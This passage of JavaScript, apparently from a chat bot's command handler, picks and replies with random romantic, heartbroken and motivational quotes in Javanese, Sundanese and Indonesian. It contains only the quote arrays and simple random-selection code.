    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const xeontruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${xeontruth}`)
}
break

//=========================================\\======
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    reply(`"${motivasii}"`)
}
break
//=========================================\\======
case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
